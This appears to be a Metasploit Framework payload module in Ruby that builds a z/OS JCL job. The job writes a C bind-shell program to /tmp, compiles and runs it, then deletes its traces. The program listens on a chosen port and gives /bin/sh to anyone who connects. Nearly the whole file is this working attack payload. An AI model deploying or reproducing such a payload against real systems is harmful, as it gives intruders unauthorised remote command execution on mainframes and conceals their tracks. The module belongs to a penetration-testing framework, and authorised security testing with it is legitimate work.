##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Single
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'z/OS JCL file to generate & compile Bind TCP',
			'Description'   => 'Listen for a connection and spawn a command shell via JCL',
			'Author'        => ['Soldier of Fortran', 'S_0xBA115',],
			'License'       => BSD_LICENSE,
			'Platform'      => 'zos',
			'Arch'          => ARCH_ZARCH,
			'Handler'       => Msf::Handler::BindTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadType'   => 'cmd',
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))
	end

	#
	# JCL Bind Shell
	#
	def jcl_bind_shell
    if (!datastore['FTPUSER'] or datastore['FTPUSER'].empty?)
       # JCL requires a username to run the job (not always but usually)
       jcl_user = ''
       job_name = ''
    else
       jcl_user = datastore['FTPUSER']
       job_name = datastore['FTPUSER'] + Rex::Text.rand_text_alpha(1)
    end
    tmp_source = Rex::Text.rand_text_alpha(1)
    tmp_exec = Rex::Text.rand_text_alpha(1)
		shell = <<-END_OF_JCL_CODE
//#{job_name.upcase}      JOB (#{job_name.upcase}),'SOF',CLASS=A,MSGCLASS=0,MSGLEVEL=(1,1)
//CREATECP  EXEC PGM=IEBGENER
//SYSPRINT  DD SYSOUT=*
//SYSIN     DD DUMMY
//SYSUT2    DD PATHOPTS=(ORDWR,OTRUNC,OCREAT),PATHMODE=SIRWXU,
//             PATHDISP=(KEEP,DELETE),
//             FILEDATA=TEXT,
//             PATH='/tmp/#{tmp_source}.c'
//SYSUT1    DD DATA,DLM=##
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
int main(int argc, char *argv[])
{
 int result , sockfd;
 int port;
 struct sockaddr_in sin;
 sockfd = socket(AF_INET,SOCK_STREAM,0);
 sin.sin_family = AF_INET;
 sin.sin_addr.s_addr = 0;
 sin.sin_port = htons(#{datastore['LPORT']});
 bind (sockfd,(struct sockaddr *)&sin,sizeof(sin));
 listen(sockfd,5);
 result = accept (sockfd,NULL,0);
 dup2(result,2);
 dup2(result,1);
 dup2(result,0);
 execl("/bin/sh","sh",NULL);
return EXIT_SUCCESS;
}
##
//OMGLOL    EXEC PGM=BPXBATCH,REGION=800M
//STDOUT    DD PATH='/tmp/mystd.out',PATHOPTS=(OWRONLY,OCREAT),
//             PATHMODE=SIRWXU
//STDERR    DD PATH='/tmp/mystd.err',PATHOPTS=(OWRONLY,OCREAT),
//             PATHMODE=SIRWXU
//STDPARM   DD *
SH cd /tmp;
cc -o /tmp/#{tmp_exec} /tmp/#{tmp_source}.c;
rm /tmp/#{tmp_source}.c;
/tmp/#{tmp_exec};
rm /tmp/#{tmp_exec}
/*
END_OF_JCL_CODE

		return shell
	end

	#
	# Constructs the payload
	#
	def generate
		return super + jcl_bind_shell
	end

end
